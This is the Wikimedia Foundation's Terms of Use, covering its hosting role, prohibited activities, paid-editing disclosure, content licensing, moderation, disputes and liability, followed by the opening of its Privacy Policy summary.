WIKIMEDIA PROJECTS BELONG TO EVERYONE

You made it. It is yours to use. For free. That means you can use it, adapt it, or share what you find on Wikimedia sites. Just do not write your own bio, or copy/paste it into your homework.



2


WE RESPECT YOUR DATA AND PRIVACY

We do not sell your email address or any of your personal information to third parties. More information about our privacy practices are available at the Wikimedia Foundation privacy policy, donor privacy policy, and data retention guidelines.

3


PEOPLE LIKE YOU KEEP WIKIPEDIA ACCURATE

Readers verify the facts. Articles are collaboratively created and edited by a community of volunteers using reliable sources, so no single person or company owns a Wikipedia article. The Wikimedia Foundation does not write or edit, but you and everyone you know can help.

4


NOT ALL WIKIS ARE WIKIMEDIA

The word “wiki” refers to a website built using collaborative editing software. Projects with no past or existing affiliation with Wikipedia or the Wikimedia Foundation, such as Wikileaks and wikiHow, also use the term. Although these sites also use “wiki” in their name, they have nothing to do with Wikimedia.

280,000+

editors contribute to Wikimedia projects every month

100+ million

media files on Wikimedia Commons and counting

1.5 billion

Throughout history, knowledge has been controlled by a powerful few. Wikipedia needs knowledge from all languages and cultures. The internet has become the default for accessing information—women, people of color, and the global south remain underrepresented. We invite you to help correct history.

Our Terms of Use

Imagine a world in which every single human being can freely share in the sum of all knowledge. That's our commitment. – Our Vision Statement

Welcome to Wikimedia! The Wikimedia Foundation, Inc. ("we" or "us" or "Foundation"), is a non-profit charitable organization, headquartered in San Francisco, California, United States, whose mission is to empower and engage people around the world to collect and develop content under a free license or in the public domain, and to disseminate it effectively and globally, free of charge.

To support our vibrant community, we provide the essential infrastructure and organizational framework for the development of multilingual wiki projects and their editions (as explained on our Wikimedia Projects page) (hereby referred to as "Projects") and other endeavors which serve this mission. We strive to make and keep educational and informational content from the Projects available on the internet free of charge, in perpetuity.

We welcome you ("you" or the "user") as a reader, or contributor of the Projects, and we encourage you to join the Wikimedia community. Before you participate, however, we ask that you please read and agree to the following Terms of Use ("Terms of Use").


OVERVIEW

These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with rare exceptions, such as under policies like these Terms of Use, for legal compliance, or when faced with urgent threats of serious harm). This means that editorial control is in the hands of you and your fellow users who create and manage the content.

The community – the network of users who are constantly building and using the Projects and/or their websites (hereby referred to as "Project Websites") – is the principal means through which the goals of the mission are achieved. The community contributes to and helps govern our Projects and Project Websites. The community also undertakes the critical function of creating and enforcing policies for the specific Project editions (such as the different language editions for the Wikipedia Project or the Wikimedia Commons multilingual edition).

You, the user, are welcome to join as a contributor, editor, or author, but you should follow the policies that govern each of the independent Project editions, including the Universal Code of Conduct (UCoC), which apply to all Project editions. The largest of our Projects is Wikipedia, but we host other Projects too, each with different objectives and work methods. Each Project edition has a team of contributors, editors or authors who work together to create and manage the content on that Project edition. You are welcome to join these teams and work with them to improve these Projects. Since we are dedicated to making content freely accessible to the public, content you contribute is made available under a free license or released in the public domain.

Please be aware that you are legally responsible for all of your contributions, edits, and reuse of Wikimedia content under the laws of the United States of America and other applicable laws (which may include laws where you or the subject of your contributions are located). This means it is important that you exercise caution when posting, modifying or reusing content. In light of this responsibility, we have some rules about what you cannot do, most of which are either for your own protection or for the protection of other users like yourself. Please keep in mind that the content we host is for general informational purposes only, so if you need expert advice for a particular question (such as medical, legal, or financial issues), you should seek the help of an appropriate professional. We also include other important notices and disclaimers, so please read these Terms of Use in their entirety.

For clarity, other organizations, such as local Wikimedia chapters and associations, that may share in the same mission are nevertheless legally independent and separate from the Wikimedia Foundation. Unless otherwise stated by the Foundation as an authorized party on a given Project's Website, those other organizations have no responsibility for the operations of the Project's Website or its content.




1. OUR SERVICES

The Wikimedia Foundation is dedicated to encouraging the growth, development, and distribution of free multilingual content, and to hosting the full content of these wiki-based Projects for the public free of charge. Our role is to host some of the largest collaboratively edited reference Projects in the world, which can be found here. However, we act only as a hosting service provider, maintaining the infrastructure and organizational framework. This infrastructure and framework allow our users to build the Projects by contributing and editing content themselves. They also allow our users to reuse that content. The infrastructure we maintain includes specialized technological infrastructure that enables users to programmatically interact with and reuse content on Projects (referred to as "Application Programming Interface" or "APIs"), and mobile applications.

As used throughout the rest of the Terms of Use, our services consist of: The Project Websites we host, technological infrastructure that we maintain, and any technical spaces that we host for the maintenance and improvement of our Projects.

Because of our unique role, there are a couple of things you should be aware of when considering our relationship to you, the Projects, and other users:

 1. We do not take an editorial role: Because the Projects are collaboratively edited, the vast majority of the content that we host is provided by users, and we do not take an editorial role. This means that we generally do not monitor or edit the content of the Project Websites, and we do not take any responsibility for this content. Similarly, unless we have expressly stated otherwise, we do not endorse any opinions expressed via our services, and we do not represent or guarantee the truthfulness, accuracy, or reliability of any submitted community content on the Projects.
 2. You are responsible for your own actions: You are legally responsible for your edits and contributions on the Projects, your reuse of content on the Projects, your use of the APIs, and your use of our services more generally. For your own protection you should exercise caution and avoid taking any actions that may result in criminal or civil liability under any applicable laws. For clarity, applicable law includes at least the laws of the United States of America and the State of California. For other countries, this is determined on a case-by-case basis. Although we may not agree with such actions, we warn users—particularly the editors, contributors, and authors—that non-U.S. authorities may seek to apply other country laws to you, including local laws where you live or where you view or edit content. We generally cannot offer any protection, guarantee, immunity or indemnification against the application of such laws.




2. PRIVACY POLICY

We ask that you review the terms of our Privacy Policy, so that you are aware of how we collect and use your information.




3. CONTENT WE HOST

 1. You may find some material objectionable or erroneous: Because we host a wide array of content that is produced or gathered by fellow users, you may encounter material that you find offensive, erroneous, misleading, mislabeled, or otherwise objectionable. We therefore ask that you use common sense and proper judgment when using our services.
 2. The Projects' content is for general informational purposes only: Although our Projects host a great deal of information that pertains to professional topics, including medical, legal, or financial issues, this content is presented for general informational purposes only. It should not be taken as professional advice. Please seek independent professional counseling from someone who is licensed or qualified in the applicable area in lieu of acting on any information, opinion, or advice contained in one of the Project Websites.




4. REFRAINING FROM CERTAIN ACTIVITIES

The Projects hosted by the Wikimedia Foundation only exist because of the vibrant community of users like you who collaborate to write, edit, and curate the content. We happily welcome your participation in this community. We encourage you to be civil and polite in your interactions with others in the community, to act in good faith, and to make edits and contributions aimed at furthering the mission of the shared Project. We ask that all users review and follow the Universal Code of Conduct ("UCoC"), which lays out requirements for collegial, civil collaboration across all Projects that we host.

Certain activities, whether legal or illegal under the applicable law, may be harmful to other users and violate our rules, and some activities may also subject you to liability. Therefore, for your own protection and for that of other users, you may not engage in such activities on, or otherwise using, our Projects. These activities include:

Harassing and Abusing Others
 * Engaging in threats, stalking, spamming, vandalism, or harassment as described in the UCoC;
 * Transmitting chain mail, junk mail, or spam to other users;
 * Posting or modifying content with the intention to seriously harm others, such as deliberate inducements to self-harm, or deliberate triggering of epilepsy.

Violating the Privacy of Others
 * Infringing the privacy rights of others under the laws of the United States of America or other applicable laws (which may include the laws where you live or where you view or edit content);
 * Soliciting personally identifiable information for the purposes of harassment, exploitation, or violation of privacy, or for any promotional or commercial purpose not explicitly approved by the Wikimedia Foundation; and
 * Soliciting personally identifiable information from anyone under the age of 18 years, or under the age of majority where you are if higher than 18 years, for an illegal purpose or violating any applicable law regarding the health or well-being of minors.

Engaging in False Statements, Impersonation, or Fraud
 * Intentionally or knowingly posting content that constitutes libel or defamation under the laws of the United States of America;
 * Posting or modifying content with the intent to deceive or mislead others;
 * Attempting to impersonate another user or individual, misrepresenting your affiliation with any individual or entity, hiding your affiliation with any individual or entity when disclosure is required by these terms or local Project policy, or using the name or username of another person with the intent to deceive; and
 * Engaging in fraud.

Committing Infringement of Intellectual Property Rights
 * Infringing copyrights, trademarks, patents, or other proprietary rights under the applicable law.

Misusing Our Services for Other Illegal Purposes
 * Posting child pornography or any other content that violates applicable law concerning child pornography or child sexual abuse material, or encouraging, grooming, or advocating for others to create or share such material;
 * Posting or trafficking in obscene material that is unlawful under applicable law; and
 * Using the services in a manner that is inconsistent with applicable law.

Engaging in Disruptive and Illegal Misuse of Facilities
 * Posting or distributing content that contains any viruses, malware, worms, Trojan horses, malicious code, or other device that could harm our technical infrastructure or system or that of other users;
 * Engaging in automated uses of the Project Websites that are abusive or disruptive of the services, violate acceptable usage policies where available, or have not been approved by the Wikimedia community;
 * Disrupting the services by placing an undue burden on an API, Project Website or the networks or servers connected with a particular Project Website;
 * Disrupting the services by inundating any of the Project Websites with communications or other traffic that suggests no serious intent to use the Project website for its stated purpose;
 * Knowingly accessing, tampering with, or using any of our non-public areas in our computer systems without authorization; and
 * Probing, scanning, or testing the vulnerability of any of our technical systems or networks unless all the following conditions are met:

 * such actions do not unduly abuse or disrupt our technical systems or networks;
 * such actions are not for personal gain (except for credit for your work);
 * you report any vulnerabilities to the relevant developers (or fix it yourself); and
 * you do not undertake such actions with malicious or destructive intent.



Shortcut:
PAID
Paid Contributions Without Disclosure
 * You must disclose each and any employer, client, intended beneficiary and affiliation with respect to any contribution for which you receive, or expect to receive, compensation. You must make that disclosure in at least one of the following ways:

 * a statement on your user page,
 * a statement on the talk page accompanying any paid contributions, or
 * a statement in the edit summary accompanying any paid contributions.

 * In addition, if you make a public posting off the Projects advertising editing services on Wikipedia in exchange for compensation of any kind, you must disclose all Wikipedia accounts you have used or will use for this service in the public posting on the third-party service.
 * Applicable law, or Project-specific policies and Foundation policies and guidelines, such as those addressing conflicts of interest, may further limit paid contributions or require more detailed disclosure. For example, infringing Wikimedia Trademarks (defined hereinafter at Section 6) to advertise paid editing services, removing disclosures on previously adequately disclosed paid edits, or logged-out paid editing in a manner that makes adequate disclosure a practical impossibility violate this section.
 * A Wikimedia Project community may adopt an alternative paid contribution disclosure policy which may supplement or replace this section. If a Project adopts an alternative disclosure policy, you may comply with that policy instead of the requirements in this section (titled "Paid Contributions Without Disclosure") when contributing to that particular Project.

For more information, please read our FAQ on disclosure of paid contributions.

We reserve the right to exercise our enforcement discretion with respect to the provisions in section 4 of these Terms of Use. Where required, enforcement of these terms may include actions not listed in the Wikimedia Foundation Office Action Policy. If enforcement is required in new circumstances, we will make an effort within at most one (1) year to update the Office Action Policy to catalog the new type of action.

Marketing Company Mediations

Undisclosed editing by users receiving compensation creates an unreasonable burden on volunteer editors who investigate and enforce community policies. Therefore, for violations of this section related to undisclosed paid editing, you agree to submit to binding "Med-Arb" (a "Marketing Company Mediation") as described in section 14 of these Terms of Use.




5. PASSWORD SECURITY

You are responsible for safeguarding your own password and other security credentials, and should never disclose them to any third party.




6. TRADEMARKS

Although you have considerable freedoms for reuse of the content on the Project Websites, it is important that, at the Wikimedia Foundation, we protect our trademark rights so that we can protect our users from fraudulent impersonators. Because of this, we ask that you please respect our trademarks. All Wikimedia Foundation trademarks belong to the Wikimedia Foundation, and any use of our trade names, trademarks, service marks, logos, or domain names must be in compliance with these Terms of Use and in compliance with our Trademark Policy.




7. LICENSING OF CONTENT

To grow the commons of free knowledge and free culture, all users contributing to the Projects or Project Websites are required to grant broad permissions to the general public to redistribute and reuse their contributions freely, so long as that use is properly attributed and the same freedom to reuse and redistribute is granted to any derivative works. In keeping with our goal of providing free information to the widest possible audience, we require that when necessary all submitted content be licensed so that it is freely reusable by anyone who may access it.

You agree to the following licensing requirements:

 1. Text to which you hold the copyright: When you submit text to which you hold the copyright, you agree to license it under:
    * Creative Commons Attribution-ShareAlike 4.0 International License ("CC BY-SA 4.0"), and
    * GNU Free Documentation License ("GFDL") (unversioned, with no invariant sections, front-cover texts, or back-cover texts).
    Reusers may comply with either license or both.
    The only exception is if the Project edition or feature requires a different license. In that case, you agree to license any text you contribute under the particular license prescribed by the Project edition or the feature. Please note that these licenses do allow commercial uses of your contributions, as long as such uses are compliant with the terms of the respective licenses. Where you own Sui Generis Database Rights covered by CC BY-SA 4.0, you waive these rights. As an example, this means facts you contribute to the projects may be reused freely without attribution.
 2. Attribution: Attribution is an important part of these licenses. We consider it giving credit where credit is due – to authors like yourself. When you contribute text, you agree to be attributed in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the article to which you contributed (since each article has a history page that lists all contributors, authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the relevant license, and which provides credit to the authors in a manner equivalent to the credit given on the Project Website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
 3. Importing text: You may import text that you have found elsewhere or that you have co-authored with others, but in such case you represent and warrant that the text is available under terms that are compatible with CC BY-SA (or, as explained above, another license when exceptionally required by the Project edition or feature). For a list of compatible licenses, see Creative Commons. You shall not import content that is available solely under GFDL.
    You agree that, if you import text under a CC license that requires attribution, you must credit the author(s) in a reasonable fashion. Where such credit is commonly given through page histories (such as Wikimedia-internal copying), it is sufficient to give attribution in the edit summary, which is recorded in the page history, when importing the text. The attribution requirements are sometimes too intrusive for particular circumstances (regardless of the license), and there may be instances where the Wikimedia community decides that imported text cannot be used for that reason.
 4. Non-text media: Non-text media on the Projects are available under a variety of different licenses that support the general goal of allowing unrestricted reuse and redistribution. When you contribute non-text media, you agree to comply with the requirements for such licenses as described in our Licensing Policy, and also comply with the requirements of the specific Project edition or feature to which you are contributing. Also see the Wikimedia Commons Licensing Policy for more information on contributing non-text media to Wikimedia Commons.
 5. No revocation of license: Except as consistent with your license, you agree that you will not unilaterally revoke or seek invalidation of any license that you have granted under these Terms of Use for text content or non-text media contributed to the Projects or features, even if you terminate use of our services.
 6. Public domain content: Content that is in the public domain is welcome. It is important however that you confirm the public domain status of the content under the law of the United States of America as well as the laws of any other countries as required by the specific Project edition. When you contribute content that is in the public domain, you warrant that the material is actually in the public domain, and you agree to label it appropriately.
 7. Re-use: Reuse of content that we host is welcome, though exceptions exist for content contributed under "fair use" or similar exemptions under applicable copyright law. Any reuse must comply with the underlying license(s).
    When you reuse or redistribute a text page developed by the Wikimedia community, you agree to attribute the authors in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the page or pages that you are reusing (since each page has a history page that lists all contributors, authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on the Project Website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
    
    If the text content was imported from another source, it is possible that the content is licensed under a compatible CC BY-SA license but not GFDL (as described in "Importing text," above). In that case, you agree to comply with the compatible CC BY-SA license and do not have the option to relicense it under GFDL. To determine the license that applies to the content that you seek to reuse or redistribute, you should review the page footer, page history, and discussion page.
    
    In addition, please be aware that text that originated from external sources and was imported into a Project may be under a license that attaches additional attribution requirements. Users agree to indicate these additional attribution requirements clearly. Depending on the Project, such requirements may appear, for example, in a banner or other notations pointing out that some or all of the content was originally published elsewhere. Where there are such visible notations, reusers should preserve them.
    
    For any non-text media, you agree to comply with the applicable license under which the work has been made available (which can be discovered by clicking on the work and looking at the licensing section on its description page or reviewing an applicable source page for that work). When reusing any content that we host, you agree to comply with the relevant attribution requirements as they pertain to the underlying license or licenses.
 8. Modifications or additions to material that you reuse: When modifying or making additions to text that you have obtained from a Project Website, you agree to license the modified or added content under CC BY-SA 4.0 or later (or, as explained above, another license when exceptionally required by the specific Project edition or feature).
    When modifying or making additions to any non-text media that you have obtained from a Project website, you agree to license the modified or added content in accordance with whatever license under which the work has been made available.
    With both text content and non-text media, you agree to clearly indicate that the original work has been modified. If you are reusing text content in a wiki, it is sufficient to indicate in the page history that you made a change to the imported text. For each copy or modified version that you distribute, you agree to include a licensing notice stating which license the work is released under, along with either a hyperlink or URL to the text of the license or a copy of the license itself.




8. DMCA COMPLIANCE

The Wikimedia Foundation wants to ensure that the content that we host can be reused by other users without fear of liability and that it is not infringing the proprietary rights of others. In fairness to our users, as well as to other creators and copyright holders, our policy is to respond to notices of alleged infringement that comply with the formalities of the Digital Millennium Copyright Act ("DMCA"). Pursuant to the DMCA, we will terminate, in appropriate circumstances, users and account holders of our system and network who are repeat infringers on our Projects and services.

However, we also recognize that not every takedown notice is valid or in good faith. In such cases, we strongly encourage users to file counter-notifications when they appropriately believe a DMCA takedown demand is invalid or improper. For more information on what to do if you think a DMCA notice has been improperly filed, you may wish to consult the Lumen Database website.

If you are the owner of content that is being improperly used on one of the Projects without your permission, you may request that the content be removed by filing a notice under the DMCA. To make such a request, please email us at legalwikimediaorg or snail mail our designated agent.

Alternatively, you may make a request to our community, which often handles copyright issues faster and more effectively than the process prescribed under the DMCA. In that case, you can post a notice explaining your copyright concerns. For a non-exhaustive and non-authoritative list of the relevant processes for the different Project editions, visit the Copyright Problems page. Before filing a DMCA claim, you also have the option of sending an email to the community at infowikimediaorg.




9. THIRD-PARTY WEBSITES AND RESOURCES

You are solely responsible for your use of any third-party websites or resources. Although the Projects and Project Websites contain links to third-party websites and resources, we do not endorse and are not responsible or liable for their availability, accuracy, or the related content, products, or services (including, without limitation, any viruses or other disabling features), nor do we have any obligation to monitor such third-party content.




10. MANAGEMENT OF WEBSITES

The community has the primary role in creating and enforcing policies applying to the different Project editions. At the Wikimedia Foundation, we rarely intervene in community decisions about policy and its enforcement.

It is possible to notify us of illegal content, or content that violates our Terms of Use (including all policies and other documents incorporated by reference) for other reasons by contacting us directly. However, you can typically make a request directly to the Project's community: this may be more efficient, and is more consistent with our Projects' aim to empower the user community.

Each Project will usually provide "Help" or "Contact" pages for further guidance, or specific tools for reporting issues. Alternatively – if in doubt – you can ask members of the community for help, by sending an email to infowikimediaorg or a more language-specific address from the Volunteer Response Team page. Please note that these mailboxes are monitored by users of the Projects, not the Foundation. As a result, they should not be threatened or issued with legal demands.

If you contact the Foundation with a problem, we will typically explore whether and how existing community-led mechanisms can investigate and, where appropriate, resolve it.

In an unusual case, the need may arise, or the community may ask us, to address an especially problematic user or especially problematic content because of significant Project disturbance or dangerous behavior. In such cases, we reserve the right, at our sole discretion (or where legally compelled), to:

 * Investigate your use of the Projects or our services (a) to determine whether a violation of these Terms of Use, Project edition policy, or other applicable law or policy has occurred, or (b) to comply with any applicable law, legal process, or an appropriate governmental request;
 * Detect, prevent, or otherwise address fraud, false or unverifiable information, security, or technical issues or respond to user support requests;
 * Refuse, revert, disable, or restrict access to contributions of any user who violates these Terms of Use;
 * Ban a user from editing or contributing or block a user's account or access for actions violating these Terms of Use, including repeat posting of unlawful material under applicable law in line with human rights principles;
 * Take legal action against users who violate these Terms of Use (including reports to law enforcement authorities); and
 * Manage otherwise the Project websites in a manner designed to facilitate their proper functioning and protect the rights, property, and safety of ourselves and our users, licensors, partners, and the public.

Those Foundation moderation activities may be informed or performed by software (such as traffic flood ("Denial of Service") protection). In those cases human review is normally available, upon request.

In the interests of our users and the Projects, in the extreme circumstance that any individual has had their account or access blocked under this section, they are prohibited from creating or using another account on or seeking access to the same Project, unless we provide explicit permission. Without limiting the authority of the community, the Foundation itself will not ban a user from editing or contributing or block a user's account or access solely because of good faith criticism that does not result in actions otherwise violating these Terms of Use or community policies.

The Wikimedia community and its members may also take action when so allowed by the community or Foundation policies applicable to the specific Project edition, including but not limited to warning, investigating, blocking, or banning users who violate those policies. You agree to comply with the final decisions of dispute resolution bodies that are established by the community for the specific Project editions (such as arbitration committees); these decisions may include sanctions as set out by the policy of the specific Project edition.

Especially problematic users who have had accounts or access blocked on multiple Project editions may be subject to a ban from all of the Project editions, in accordance with the Global Ban Policy. In contrast to Board resolutions or these Terms of Use, policies established by the community, which may cover a single Project edition or multiple Projects editions (like the Global Ban Policy), may be modified by the relevant community according to its own procedures.

The blocking of an account or access or the banning of a user under this provision shall be in accordance with Section 13 of these Terms of Use.

If you believe we have not satisfactorily acted on a problematic content report, or if you have been subjected to a Foundation moderation action that you wish to challenge, you may be able to submit an appeal.  Other information about routes of appeal may also be explained to you at the time, or in Project-specific help pages.

We reserve the right to suspend (temporarily, or permanently) our handling of reports or other correspondence from users or third parties, whether about allegedly illegal or otherwise problematic content or conduct, or requesting appeals against moderation actions, if such correspondence was made in bad faith, repetitive, unfounded, and/or abusive. In appropriate circumstances, your email address may even be blocked on our email system(s), and you will then need to contact us at our postal address if you wish to further correspond with us during that block. For less serious cases (e.g. up to three polite emails about one or more meritless complaints), this is likely to be temporary. More frequent or more abusive communications are more likely to lead to permanent measures.




11. RESOLUTIONS AND PROJECT POLICIES

The Wikimedia Foundation Board of Trustees releases official policies from time to time. Some of these policies may be mandatory for a particular Project or Project edition, and, when they are, you agree to abide by them as applicable.




12. API TERMS

We make available a set of APIs, which include documentation and associated tools, to enable users to build products that promote free knowledge. By using our APIs, you agree to abide by all applicable policies governing the use of the APIs, which include but are not limited to the User-Agent Policy, the Robot Policy, and the API:Etiquette (collectively, "API Documentation"), which are incorporated into these Terms of Use by reference.




13. TERMINATION

Though we hope you will stay and continue to contribute to the Projects, you can stop using our services any time. In certain (hopefully unlikely) circumstances it may be necessary for either ourselves or the Wikimedia community or its members (as described in Section 10) to terminate part or all of our services, terminate these Terms of Use, block your account or access, or ban you as a user. If your account or access is blocked or otherwise terminated for any reason, your public contributions and a record of your activities on or in relation to the Projects (including any correspondence you have sent us) will be unaffected (subject to applicable policies), and you may still access our public pages for the sole purpose of reading publicly available content on the Projects. In such circumstances, however, you may not be able to access your account or settings. However, regardless of any other provision in these Terms of Use, we reserve the right to suspend or end the services at any time, with or without cause, and with or without notice. Even after your use and participation are banned, blocked or otherwise suspended, these Terms of Use will remain in effect with respect to relevant provisions, including Sections 1, 3, 4, 6, 7, 9-16, and 18.




14. DISPUTES AND JURISDICTION

Highlighted for emphasis

We hope that no serious disagreements arise involving you, but, in the event there is a dispute, we encourage you to seek resolution through the dispute resolution procedures or mechanisms provided by the Projects or Project editions and the Wikimedia Foundation. If you seek to file a legal claim against us, you agree to file and resolve it exclusively in a state or federal court located in San Francisco County, California. You also agree that the laws of the State of California and, to the extent applicable, the laws of the United States of America will govern these Terms of Use, as well as any legal claim that might arise between you and us (without reference to conflict of laws principles). You agree to submit to the personal jurisdiction of, and agree that venue is proper in, the courts located in San Francisco County, California, in any legal action or proceeding relating to us or these Terms of Use.

To ensure that disputes are dealt with soon after they arise, you agree that regardless of any statute or law to the contrary, any claim or cause of action you might have arising out of or related to use of our services or these Terms of Use must be filed within the applicable statute of limitations or, if earlier, one (1) year after the pertinent facts underlying such claim or cause of action could have been discovered with reasonable diligence (or be forever barred).

Marketing Company Mediations As described in section 4 of these Terms of Use, you agree to resolve violations of the Paid Contributions without Disclosure in a Marketing Company Mediation at the Foundation's discretion. Marketing Company Mediations are binding mediations where, at the end of either a half or full day session, any disputed items that remain unresolved will be decided by the mediator in a legally binding decision. They will be conducted in meetings by teleconference or videoconference. If an in-person meeting is required, then the Marketing Company Mediation will take place in San Francisco County, California. The parties will split all fees and expenses related to the mediation/arbitration equally.

You agree, as part of a Marketing Company Mediation, to cooperate with the Foundation, including by timely providing any documentation in your possession relating to your undisclosed paid editing activities including the accounts used, articles affected, and clients who purchased such services.

Marketing Company Mediations are subject to and governed by the Federal Arbitration Act to the extent that the mediator becomes an arbitrator. The prevailing party shall be entitled to recover its attorneys' fees (including all fees necessary to determine the applicability of the Marketing Company Mediation and to enforce the binding result) and all costs relating to the investigation and enforcement of its rights. A party may be deemed "prevailing" even if it is not successful on every claim asserted.

If for some reason the entirety of these Marketing Company Mediation requirements are found to be unenforceable, you agree to resolve any disputes as described in the beginning of this section.




15. DISCLAIMERS

Highlighted for emphasis

At the Wikimedia Foundation, we do our best to provide educational and informational content to a very wide audience, but your use of our services is at your sole risk. We provide these services on an "as is" and "as available" basis, and we expressly disclaim all express or implied warranties of all kinds, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. We make no warranty that our services will meet your requirements, be safe, secure, uninterrupted, timely, accurate, or error-free, or that your information will be secure.

We are not responsible for the content, data, or actions of third parties, and you release us, our directors, officers, employees, and agents from any claims and damages, known and unknown, arising out of or in any way connected with any claim you have against any such third parties. No advice or information, whether oral or written, obtained by you from us or through or from our services creates any warranty not expressly stated in these Terms of Use.

Any material downloaded or otherwise obtained through your use of our services is done at your own discretion and risk, and you will be solely responsible for any damage to your computer system or loss of data that results from the download of any such material. You agree that we have no responsibility or liability for the deletion of, or the failure to store or to transmit, any content or communication maintained by the service. We retain the right to create limits on use and storage at our sole discretion at any time with or without notice.

Some states or jurisdictions do not allow the types of disclaimers in this section, so they may not apply to you either in part or in full depending on the law.




16. LIMITATION ON LIABILITY

Highlighted for emphasis

The Wikimedia Foundation will not be liable to you or to any other party for any direct, indirect, incidental, special, consequential or exemplary damages, including but not limited to, damages for loss of profits, goodwill, use, data, or other intangible losses, regardless of whether we were advised of the possibility of such damage. In no event shall our liability exceed one thousand U.S. dollars (US$1,000.00) in aggregate. In the case that applicable law may not allow the limitation or exclusion of liability or incidental or consequential damages, the above limitation or exclusion may not apply to you, although our liability will be limited to the fullest extent permitted by applicable law.




17. MODIFICATIONS TO THESE TERMS OF USE

Just as the Wikimedia community's input is essential for the growth and maintenance of the Projects, we believe that community input is essential for these Terms of Use to properly serve our users. It is also essential for a fair contract. Therefore, we will provide these Terms of Use, as well as any substantial future revisions of these Terms of Use, to the community for comment at least thirty (30) days before the end of the comment period. If a future proposed revision is substantial, we will provide an additional 30 days for comments after posting a translation of the proposed revision in at least three languages (selected at our discretion). The community will be encouraged to translate the proposed revision in other languages as appropriate. For changes for legal or administrative reasons, to correct an inaccurate statement, or changes in response to community comments, we will provide at least three (3) days' notice.

Because it may be necessary to modify these Terms of Use from time to time, we will provide notice of such modifications and the opportunity to comment via the Project websites, and via a notification on WikimediaAnnounce-l. However, we ask that you please periodically review the most up-to-date version of these Terms of Use. Your continued use of our services after the new Terms of Use become official following the notice and review period constitutes an acceptance of these Terms of Use on your part. For the protection of the Wikimedia Foundation and other users like yourself, if you do not agree with our Terms of Use, you cannot use our services.




18. OTHER TERMS

These Terms of Use do not create an employment, agency, partnership, joint control or joint venture relationship between you and us, the Wikimedia Foundation. For the purposes of European Economic Area law, United Kingdom law, or other laws that involve a similar concept, you are not acting "under the authority of" the Foundation when you use the services. If you have not signed a separate agreement with us, these Terms of Use are the entire agreement between you and us. If there is any conflict between these Terms of Use and a signed written agreement between you and us, the signed agreement will control.

You agree that we may provide you with notices, including those regarding changes to the Terms of Use, by email, regular mail, or postings on the Projects or Project Websites.

If in any circumstance, we do not apply or enforce any provision of these Terms of Use, it is not a waiver of that provision.

You understand that, unless otherwise agreed to in writing by us, you have no expectation of compensation for any activity, contribution, or idea that you provide to us, the community, or the Projects or Project editions.

Notwithstanding any provision to the contrary in these Terms of Use, we (the Wikimedia Foundation) and you agree not to modify the applicable terms and requirements of any free license that is employed on the Projects or Project editions when such free license is authorized by these Terms of Use.

These Terms of Use were written in English (U.S.). While we hope that translations of these Terms of Use are accurate, in the event of any differences in meaning between the original English version and a translation, the original English version takes precedence.

If any provision or part of a provision of these Terms of Use is found unlawful, void, or unenforceable, that provision or part of the provision is deemed severable from these Terms of Use and will be enforced to the maximum extent permissible, and all other provisions of these Terms of Use will remain in full force and effect.


THANK YOU!

We appreciate your taking the time to read these Terms of Use, and we are very happy to have you contributing to the Projects and using our services. Through your contributions, you are helping to build something really big – not only an important collection of collaboratively edited reference Projects that provides education and information to millions who might otherwise lack access, but also a vibrant community of like-minded and engaged peers, focused on a very noble goal.

Wikimedia Foundation Privacy Policy

This is a summary of the Privacy Policy. To read the full terms, scroll down or click here.
Disclaimer: This summary is not a part of the Privacy Policy and is not a legal document. It is simply a handy reference for understanding the full Privacy Policy. Think of it as the user-friendly interface to our Privacy Policy.


Because we believe that you should not have to provide personal information to participate in the free knowledge movement, you may:

 * Read, edit, or use any Wikimedia Site without registering an account.
 * Register for an account without providing an email address or real name.

Because we want to understand how Wikimedia Sites are used so we can make them better for you, we collect some information when you:

 * Make public contributions.
 * Register an account or update your user page.
 * Use the Wikimedia Sites.
 * Send us emails or participate in a survey or give feedback.

We are committed to:

 * Describing how your information may be used or shared in this Privacy Policy.
 * Using reasonable measures to keep your information secure.
 * Never selling your information or sharing it with third parties for marketing purposes.
 * Only sharing your information in limited circumstances, such as to improve the Wikimedia Sites, to comply with the law, or to protect you and others.
 * Retaining your data for the shortest possible time that is consistent with maintaining, understanding, and improving the Wikimedia Sites, and our obligations under applicable law.

Be aware:

 * Any content you add or any change that you make to a Wikimedia Site will be publicly and permanently available.
 * If you add content or make a change to a Wikimedia Site without logging in, that content or change will be publicly and permanently attributed to the IP address used at the time rather than a username.
 * Our community of volunteer editors and contributors is a self-policing body. Certain administrators of the Wikimedia Sites, who are chosen by the community, use tools that grant them limited access to nonpublic information about recent contributions so they may protect the Wikimedia Sites and enforce policies.
 * This Privacy Policy does not apply to all sites and services run by the Wikimedia Foundation, such as sites or services that have their own privacy policy (like the Wikimedia Shop) or sites or services run by third parties (like third-party developer projects on Wikimedia Cloud Services).
 * As part of our commitment to education and research around the world, we occasionally release public information and aggregated or non-personal information to the general public through data dumps and data sets.
 * For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.

INTRODUCTION


WELCOME!



The Wikimedia Foundation is the nonprofit organization that operates collaborative, free knowledge websites, like Wikipedia, Wikimedia Commons, and Wiktionary.

This Policy explains how we collect, use, and share your Personal Information.

 * We collect very little Personal Information about you.
 * We do not rent or sell your Personal Information to third parties.

By using Wikimedia Sites, you consent to this Policy.

The Wikimedia movement is founded on a simple, but powerful principle: we can do more together than any of us can do alone. We cannot work collectively without gathering, sharing, and analyzing information about our users as we seek new ways to make the Wikimedia Sites more usable, safer, and more beneficial.

